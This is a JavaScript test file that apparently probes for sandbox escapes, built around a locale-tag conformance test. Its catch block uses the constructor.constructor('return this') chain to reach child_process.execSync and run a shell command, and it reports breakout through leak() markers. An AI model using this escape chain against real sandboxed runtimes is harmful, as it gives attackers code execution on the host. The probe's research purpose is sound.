try {
    const invalidCases = [
        'en-u-c0',
        'en-u-00'
    ];
    const validCases = ['en-u-0c'];
    for (let invalid of invalidCases) {
        assert.sameValue(isCanonicalizedStructurallyValidLanguageTag(invalid), false, '"' + invalid + '" isn\'t a structurally valid language tag.');
        assert.throws(RangeError, () => {
            throw () => {
                return () => {
                };
            };
            return Intl.getCanonicalLocales(invalid);
        });
    }
    for (let valid of validCases) {
        assert(isCanonicalizedStructurallyValidLanguageTag(valid), '"' + valid + '" is a canonical and structurally valid language tag.');
        let result = Intl.getCanonicalLocales(valid);
        assert.sameValue(result.length, 1);
        assert.sameValue(result[0], valid);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}